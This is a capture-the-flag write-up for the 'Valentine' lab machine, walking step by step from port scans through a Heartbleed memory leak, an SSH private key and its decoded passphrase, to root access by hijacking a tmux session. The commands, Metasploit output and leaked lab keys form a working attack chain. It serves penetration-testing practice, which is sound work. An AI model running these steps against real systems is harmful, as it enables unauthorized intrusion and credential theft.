# Valentine

## SYN Scan
```
nmap -sS -sV -O -p- -v -T4 -oA nmap/full_syn 10.10.10.79

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Directory Listing (/dev)
![dev](./screenshots/directory_listing_dev.png)

### notes.txt
```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

### hype_key
```
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 ...
```

HEX to ASCII
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

### Encoder and Decoder
`/encode.php`

`/decode.php`

## Hearthbleed Vulnerability
```
nmap -p 443 --script ssl-heartbleed -oA nmap/heartbleed 10.10.10.79

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
```

### Metasploit Module
```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set action SCAN
action => SCAN
```

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit

[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
[*] 10.10.10.79:443       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set action KEYS
action => KEYS
```

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit

[*] 10.10.10.79:443       - Scanning for private keys
[*] 10.10.10.79:443       - Getting public key constants...
[*] 10.10.10.79:443       - 2021-03-28 23:35:02 UTC - Starting.
[*] 10.10.10.79:443       - 2021-03-28 23:35:02 UTC - Attempt 0...
[+] 10.10.10.79:443       - 2021-03-28 23:35:03 UTC - Got the private key
[*] 10.10.10.79:443       - -----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAwygXrPgZKkHSij/OeRwZ9PtI+tMvM2tvyJz5o78ZZqihjfki
Yg7hnkVQH1kvrLqVz68jqlTJZEAPJajF3cvEHIcM0nMSLnd2z4lI+zlK4fU9QMO1
moJo9o2Msk0/TwMJwLqtdF1TZLBXakQPH7f2+wWIrrLByt6m+8Vmd0YpdWDQr5Hd
WTA6C4+FIeVdyCIcVup6Lw0nXOKn1i5VRheHItUbZmIlhfoJHDhtGxSeqXrgMU1D
Js6wkebQm0jYz095+a8SRNRl5P93R1aFTTvprdtN6y0pl/hampnDrRcabHOkBB/l
1Y6ox6YgrorgULjxstJI3n2ziQ226G3Ho4JelwIDAQABAoIBAQCWkqd5wE6CSRjt
q/9deC4a04riY/CmJr2vtlXyXi52A6Pqi49YwwyW9fm0xjY/ehK+k+3brOFZ5QcK
0mYgE+iy7gwZj8k2atwTkmPp2bGKF5J0FsxWc0oS+PHWXD19c+Wheyb7gkomhNxd
VDerDGCWGxXzXF6jbRi/ZvYBDvRL59YOvXmdQa3MKykGywUn+NFZvUxICyEma24K
5ABMIWm5cTmDzm5Cd5/wn5Pu4tY0TIzfoa3KnA+M8vpmd4xgRGWGpatFKrM3LqSq
W0+Rr81Ty/R7lr1DkLDKp1ltvCl3pp1Lkoo3Ublk38C6gHHS3Vfs6h+QJfNgjeQu
RyKqm3H5AoGBAM8MF8KO2EtVQUrosnZQfn+2pLbY4n4Q66N3QaBeoqY7UipBJ1r3
jIfupiw5+M1gEXvBgnQmRLwRAA7Wmsh0/eCxeOk7kgNr7W8nNdxwp0Uv06h1CtEq
vFIuXab5pYG5/QKshabSXxY02QuaVgM/vXBTSOO0TC/7Rm6ORJzAxAeTAoGBAPFM
TE9WpalFjB0u+hHNbFRfRet8480wa5702AEDK/cHi0U+R9Z0Va/qm7PtzBP/m4nU
XJwZbvG9O2PKXusGmgIBc/jqSQpQriIvBb27AJiq65Jd7tJ4AiNZm6v/bFChFmWh
dZe1S4vBgnlYoRWHsu+3JJpMJFKZYYl9O/X8ZWdtAoGBAK1DJmL23MP13UTNhAKE
i8deVWp6BteOW1KZCr8kUqIfRDv99+wk+mIKcN7TyIQ9H4RbxEpkd+KVq2G/bxnO
5WFxwogTBLZ+S9xXiLgnQaMhSdNP1rSBOcTf7hk8EqeDt9nT+6hFpbLUmMkf51ii
r2nfGEEM8TC56w+7WGmA2sqnAoGBAOakinBvnwuMmaAvjgJEO57uLlQoXUp9VPFs
kaduE7EdOecm393B90GeW9QBoccf1NlK7naa7OwOd90ry8yU09LE9shfkQ9WDQxJ
rBAt1iUXgvK17Jiq80g818rw6+SqBVGBongvZ5WfkwpQSDDfM49knI0L6NA3If8c
gJrg9UCFAoGBAIetkT/XaN+IV3N/mkBVwLXPcDIP8aGp/qJaA6gd9ThPUh9dB8rI
bntGLbQ1rVg4Rl8NZaMi6vvgllqpecgrTOTDvhdyvWG21ayuyD3kYkPxB91bkUo2
+xJUUVx5lM5NNiefWNB+2RPBdsjSHa0VMYA3E1gjp/WQa9eelevdTBVk
-----END RSA PRIVATE KEY-----
```

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
action => DUMP
```

```
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit

[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
[+] 10.10.10.79:443       - Heartbeat data stored in ***
[*] 10.10.10.79:443       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

heartbleed_dump.bin
```
$ strings heartbleed_dump.bin      
ux i686; rv:45.0) Gecko/20100101 Firefox/45.0
Referer: https://127.0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
...
```

## SSH via RSA Private Key
Decoded `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==` which was found in `heartbleed_dump.bin` and it turned out to be `hype` user's RSA private key's (id_rsa) password.

```
$ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d        
heartbleedbelievethehype
```

```
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
```

## The User Flag
```
hype@Valentine:~$ ls -l /home/hype/Desktop/
total 4
-rw-rw-r-- 1 hype hype 33 Dec 13  2017 user.txt
```

```
hype@Valentine:~$ cat /home/hype/Desktop/user.txt 
e6710a5464769fd5fcd216e076961750
```

## Privilege Escalation via tmux Session Hijacking
root user is running a tmux session and the session's socket is located in `/.devs/dev_sess`.

```
1020  0.0  0.1  26416  1668 ?        Ss   17:07   0:00 /usr/bin/tmux -S /.devs/dev_sess
```

https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes

```
hype@Valentine:~$ tmux -S /.devs/dev_sess ls
0: 1 windows (created Sun Mar 28 17:20:27 2021) [80x24]
```

```
hype@Valentine:~$ tmux -S /.devs/dev_sess attach -t 0
```

```
root@Valentine:/# id
uid=0(root) gid=0(root) groups=0(root)
```

## The Root Flag
```
root@Valentine:/# ls -l /root/
total 8
-rwxr-xr-x 1 root root 388 Dec 13  2017 curl.sh
-rw-r--r-- 1 root root  33 Dec 13  2017 root.txt
```

```
root@Valentine:/# cat /root/root.txt
f1bb6d759df1f272914ebbc9ed7765b2
```
